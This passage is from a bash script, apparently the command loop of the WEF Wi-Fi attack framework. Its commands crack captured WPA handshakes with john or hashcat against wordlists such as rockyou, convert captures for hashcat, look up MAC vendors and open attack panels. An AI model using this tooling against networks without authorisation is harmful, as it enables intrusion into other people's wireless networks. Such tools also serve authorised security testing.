            color_output_ln "*" "Usage example: john /path/to/capture.cap /path/to/wordlist.txt"
            color_output "*" "Preinstalled wordlists are available as argument: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800"
          else
            color_output_ln "*" "Ejemplo de uso: john /ruta/de/la/captura.cap /ruta/del/diccionario.txt"
            color_output "*" "Los diccionarios preinstalados estan disponibles como argumentos: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800"
          fi
        fi

      elif [ "$(echo $option | awk '{print $1}')" == "hashcat" ]; then

        if [ ! "$(command -v hashcat)" ] || [ ! "$(command -v hcxpcapngtool)" ]; then
          echo
        fi

        hashcat_tools_missing="false"
        if [ ! "$(command -v hashcat)" ]; then
          log_command_not_found "hashcat"
          hashcat_tools_missing="true"
        fi

        if [ ! "$(command -v hcxpcapngtool)" ]; then
          log_command_not_found "hcxpcapngtool"
          hashcat_tools_missing="true"
        fi

        if [ "$hashcat_tools_missing" == "true" ]; then
          continue
        fi

        capture_file="$(echo "$option" | awk '{print $2}')"
        wordlist_to_use="$(echo "$option" | awk '{print $3}')"

        if [ "$capture_file" ] && [ "$wordlist_to_use" ]; then
          if [ "$wordlist_to_use" == "rockyou" ]; then
            wordlist_to_use="/usr/share/wef/main/wordlists/rockyou.txt"
          elif [ "$wordlist_to_use" == "darkweb2017-top10000" ]; then
            wordlist_to_use="/usr/share/wef/main/wordlists/darkweb2017-top10000.txt"
          elif [ "$wordlist_to_use" == "probable-v2-wpa-top4800" ]; then
            wordlist_to_use="/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt"
          fi

          crack_handshake_hashcat "${capture_file}"
        else
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "Usage example: hashcat /path/to/capture.cap /path/to/wordlist.txt"
            color_output "*" "Preinstalled wordlists are available as argument: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800"
          else
            color_output_ln "*" "Ejemplo de uso: hashcat /ruta/de/la/captura.cap /ruta/del/diccionario.txt"
            color_output "*" "Los diccionarios preinstalados estan disponibles como argumentos: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800"
          fi
        fi

      elif [ "$(echo $option | awk '{print $1}')" == "convert" ]; then
        if [ ! "$(command -v hcxpcapngtool)" ]; then
          echo
          log_command_not_found "hcxpcapngtool"
          continue
        fi

        capture_file="$(echo "$option" | awk '{print $2}')"
        output_file="$(echo "$option" | awk '{print $3}')"
        if [ "$capture_file" ] && [ "$output_file" ]; then
          hcxpcapngtool -o "${output_file}" "${capture_file}" &>/dev/null
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "File converted successfully"
          else
            color_output_ln "*" "Archivo convertido correctamente"
          fi
        else
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "Usage example: convert /path/to/capture.cap output.hc22000"
          else
            color_output_ln "*" "Ejemplo de uso: convert /ruta/de/la/captura.cap output.hc22000"
          fi
        fi

      elif [ "$(echo $option | awk '{print $1}')" == "identify" ]; then
        mac_to_identify="$(echo "$option" | awk '{print $2}')"

        if [ "$mac_to_identify" ]; then
          vendor="$(get_vendor_from_mac "${mac_to_identify}")"

          if [ "$vendor" ]; then
            color_output_ln "*" "Vendor: ${yC}${vendor}"
          else
            color_output_ln "*" "Vendor: ${yC}unknown"
          fi
        else
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "Usage example: identify 00:c0:ca:b0:23:84"
          else
            color_output_ln "*" "Ejemplo de uso: identify 00:c0:ca:b0:23:84"
          fi
        fi

      elif [ "$option" == "info" ] || [ "$option" == "status" ]; then
        print_interface_name
        print_interface_mode
        print_mac_address
        print_chipset
        print_freq_band

      elif [ "$option" == "panel" ]; then
        attacks_panel

      elif [ "$option" == "attacks" ]; then
        log_functions_info

      elif [ "$option" == "chipsets" ] || [ "$option" == "chipset" ]; then
        chipsets_panel

      elif [ "$option" == "update" ]; then
        echo
        if [ "$lang" == "en" ]; then
          progress_bar 2 0.3 "*" "Checking the latest version"
        else
          progress_bar 2 0.3 "*" "Comprobando la última versión"
        fi
        sleep 0.2
        if [ "$(curl -s -X GET 'https://raw.githubusercontent.com/D3Ext/WEF/main/src/version.txt')" != "${program_version}" ]; then
          if [ "$lang" == "en" ]; then
            echo -ne "\n${blueC}[${greenC}+${blueC}] New version found. Do you want to update WEF? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read update_option
          else
            echo -ne "\n${blueC}[${greenC}+${blueC}] Nueva versión encontrada. ¿Quieres actualizar WEF? (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read update_option
          fi

          if [ "$update_option" == "y" ] || [ "$update_option" == "yes" ] || [ "$update_option" == "s" ] || [ "$update_option" == "si" ]; then
            run_update

            if [ "$lang" == "en" ]; then
              good_output_ln "+" "Update completed successfully"
              color_output "*" "Execute WEF again to use the new version"
            else
              good_output_ln "+" "Actualización completada correctamente"
              color_output "*" "Ejecuta de nuevo WEF para utilizar la nueva versión"
            fi

            exit 0
          fi
        else
          if [ "$lang" == "en" ]; then
            good_output_ln "+" "This is the latest version"
          else
            good_output_ln "+" "Esta es la ultima versión"
          fi
        fi

      elif [ "$option" == "edit" ]; then
        editor=$(echo $EDITOR)

        if [ "${editor}" ]; then
          ${editor} /usr/share/wef/wef.cnf
        else
          nano /usr/share/wef/wef.cnf
        fi

      elif [ "$option" == "clear" ] || [ "$option" == "cls" ]; then
        clear

      elif [ "$option" == "version" ]; then
        if [ "$lang" == "en" ]; then
          echo -e "\nwef v${program_version} for linux (https://github.com/D3Ext/WEF)"
          echo -e "Created by D3Ext <d3ext@proton.me>"
        else
          echo -e "\nwef v${program_version} para linux (https://github.com/D3Ext/WEF)"
          echo -e "Creado por D3Ext <d3ext@proton.me>"
        fi

      elif [ "$option" == "exit" ] || [ "$option" == "quit" ] || [ "$option" == "salir" ]; then
        ctrl_c

      elif [ "$option" == "help" ] || [ "$option" == "?" ] || [ "$option" == "Help" ]; then
        commands_panel

      else # Finally enter in this case if the command is invalid
        if [ "$lang" == "en" ]; then
          color_output_ln "X" "Unknown command, type ${yC}help"
        else
          color_output_ln "X" "Comando inválido, escribe ${yC}help"
        fi
      fi
    
    done

  else
    help_panel
  fi

else
  echo -e "${yC} __      _____ ___ "
  echo -e " \ \    / / __| __|"
  echo -e "  \ \/\/ /| _|| _| "
  echo -e "   \_/\_/ |___|_|  ${endC}"

  if [ "$lang" == "en" ]; then
    color_output_ln "X" "Execute the program as root"
  else
    color_output_ln "X" "Ejecuta el programa como root"
  fi
  
  exit 1
fi


